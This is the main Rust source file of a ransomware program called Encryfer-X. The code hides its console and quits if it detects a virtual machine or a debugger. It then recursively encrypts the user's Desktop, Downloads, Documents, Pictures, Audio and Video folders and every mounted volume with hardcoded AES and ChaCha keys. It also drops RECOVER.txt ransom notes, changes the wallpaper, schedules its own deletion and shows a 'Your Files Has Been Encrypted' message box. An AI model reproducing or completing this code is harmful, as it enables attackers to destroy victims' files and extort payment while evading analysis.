/*
    Encryfer-X is an Ransomware written in Rust. 
    By Smukx
*/

use std::path::{Path, PathBuf};
use encrypt::create_readme_file;
use file_operand::{get_all_volumes,schedule_self_delete};
use winapi::um::{
    debugapi::{CheckRemoteDebuggerPresent, IsDebuggerPresent}, processthreadsapi::GetCurrentProcess, wincon::{
        FreeConsole, 
        GetConsoleWindow
    }, winuser::{
        MessageBoxA,
        ShowWindow,
        MB_ICONEXCLAMATION
    }
};

use aes::Aes256;
use aes::cipher::{KeyIvInit,StreamCipher};
use hex::decode;
mod encrypt;
mod file_operand;
mod wall;
mod evade_vm;
use wall::maldev_wallpaper;
use dirs::{desktop_dir, download_dir, document_dir, picture_dir, audio_dir, video_dir};
type Aes256Ctr = ctr::Ctr128BE<Aes256>;

fn main() {

    unsafe{
        FreeConsole();

        let hwnd = GetConsoleWindow();
        if !hwnd.is_null(){
            ShowWindow(hwnd, 0);
        }
    }
    // println!("Success Point 1");
    
  
    // let aes_key: [u8; 32] = [27, 20, 127, 230, 201, 208, 178, 24, 197, 76, 96, 12, 16, 47, 231, 42, 156, 36
    // , 136, 165, 162, 223, 206, 190, 126, 59, 96, 99, 157, 122, 32, 165]; // Replace with your AES key
    // let chacha_key: [u8; 32] = [135, 239, 131, 39, 170, 37, 22, 137, 161, 39, 117, 6, 83, 156, 42, 242, 240, 55, 67, 47
    // , 206, 10, 84, 170, 44, 211, 106, 74, 12, 67, 222, 158]; // Replace with your ChaCha key
    // let chacha_nonce: [u8; 12] = [197, 126, 31, 217, 118, 253, 225, 182, 67, 54, 97, 77]; // Replace with your ChaCha nonce

    // main_directory to check out !

    // check if binary file running at VM. Exits the Program if running !

    let vms: bool = evade_vm::evade_vms();
    
    if vms == false{
        std::process::exit(0x100);
    }

    // Check if the program is running an dbgger
    unsafe { debug() };
    
    // To common C:// common folders that contains sensitive files !
    let dirs_to_encrypt = vec![
        desktop_dir(),
        download_dir(),
        document_dir(),
        picture_dir(),
        audio_dir(),
        video_dir(),
    ];

    for dir in dirs_to_encrypt.iter().flatten(){
        encryptor(dir);
        create_readme_file(dir);
    }

    // Use it to encrypt Volumes present in the Computer. May take some time depends upon the files victm has
    maldev_wallpaper();
    schedule_self_delete();
    volume_paths();
    display_message();

    std::process::exit(0x100);
}


// Decrypt the main key
fn decrypt_combined_key(encrypted_key: &[u8], aes_key: &[u8; 32]) -> Result<Vec<u8>, &'static str> {
    if encrypted_key.len() < 16 {
        return Err("Invalid encrypted key length");
    }
    let aes_iv: [u8; 16] = encrypted_key[0..16].try_into().unwrap();
    let mut cipher = Aes256Ctr::new(aes_key.into(), &aes_iv.into());
    let mut decrypted_key = encrypted_key[16..].to_vec();
    cipher.apply_keystream(&mut decrypted_key);
    Ok(decrypted_key)
}

// Split the decrypted keys into the original components
fn split_keys(combined_key: &[u8]) -> ([u8; 32], [u8; 32], [u8; 12]) {
    let aes_key: [u8; 32] = combined_key[0..32].try_into().unwrap();
    let chacha_key: [u8; 32] = combined_key[32..64].try_into().unwrap();
    let chacha_nonce: [u8; 12] = combined_key[64..76].try_into().unwrap();
    (aes_key, chacha_key, chacha_nonce)
}

fn display_message() {
    unsafe {
        MessageBoxA(
            std::ptr::null_mut(),
            "Read RECOVER.txt file on Each Encrypted Folder for more information\0".as_ptr() as *const i8,
            "Your Files Has Been Encrypted\0".as_ptr() as *const i8,
            MB_ICONEXCLAMATION,
        );
    }
}


fn decrypt_hexa(keys: String)-> Vec<u8>{
    let dec_hexa = decode(keys).expect("Failed to decode Hex");
    let decrypt_vec_key: Vec<u8> = dec_hexa.iter().cloned().collect();

    decrypt_vec_key
}


fn encryptor(dir_path: &Path){
    // For testing ...!
    // let dir_path: &Path = Path::new("D:/maldev/Encrypor-X/test");

    let aes_key: [u8; 32] = [
        27, 20, 127, 230, 201, 208, 178, 24, 197, 76, 96, 12, 16, 47, 231, 42, 156, 36, 136, 165, 162, 223, 206, 190, 126, 59, 96, 99, 157, 122, 32, 165
    ];
    
    let ma1n_k3y = "58add3b1ecdd2a00d7f5f40fe04e46dff4beff64fa127f6a6b045d6788d58c1dd19675241841b5b15e4095ce39a01387609572d83acc5def7a04564ece79987a7b19cf1ecca6c5d672b91d94239079a30e7130a099fc7d9c8fc94d07".to_string();
    
    let v3c_value = decrypt_hexa(ma1n_k3y);
    
    let decrypted_keys = decrypt_combined_key(&v3c_value, &aes_key).unwrap();
    let (aes_key_dec, chacha_key, chacha_nonce) = split_keys(&decrypted_keys);


    file_operand::recursive_encrypt(
        &dir_path,
        &aes_key_dec,
        &chacha_key,
        &chacha_nonce,
    );
    
    // println!("{:?}", aes_key_dec); 
    // println!("{:?}", chacha_key);  
    // println!("{:?}", chacha_nonce);
}

fn volume_paths(){
        // To encrypt each and every disk ! 
        // let volumes = get_all_volumes_except_c();
        if get_all_volumes().is_empty() {
            return;
        }
        
        for volume in get_all_volumes() {
            create_readme_file(&PathBuf::from(&volume));
            encryptor(Path::new(&volume));
        }
}

unsafe fn debug(){
    let mut debugger: i32 = 1;

    CheckRemoteDebuggerPresent(
        GetCurrentProcess(), 
        &mut debugger
    );
    
    let debugger1 = IsDebuggerPresent();
  
    if debugger != 0{
        // println!("Debugger is detected. Exiting...");
        std::process::exit(0x100);
    }else if debugger1 != 0{
        // println!("Debugger is detected. Exiting...");
        std::process::exit(0x100);

    }
}